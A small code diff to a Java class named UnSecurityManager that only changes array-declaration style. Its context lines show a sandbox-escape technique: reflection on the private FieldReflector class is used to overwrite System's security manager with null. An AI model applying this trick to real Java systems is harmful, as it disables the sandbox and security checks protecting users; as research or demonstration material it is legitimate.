@@ -22,7 +22,7 @@ class UnSecurityManager {
 
       // Creates an ObjectStreamField representing a serializable field with the named s with type long.
       ObjectStreamField osf = new ObjectStreamField("s", long.class);
-      ObjectStreamField osfArray[] = new ObjectStreamField[] { osf };
+      ObjectStreamField[] osfArray = new ObjectStreamField[]{osf};
 
       // FieldReflector is a private static class for setting and retrieving serializable field values
       Class<?> FieldReflector = Class.forName("java.io.ObjectStreamClass$FieldReflector");
@@ -44,7 +44,7 @@ class UnSecurityManager {
       System.out.println(System.getSecurityManager());
 
       // Overwrite the security manager for the system with null (zeros).
-      byte zeros[] = new byte[8];
+      byte[] zeros = new byte[8];
       setPrimFieldValues.invoke(fr, System.class, zeros);
 
       sm = System.getSecurityManager();
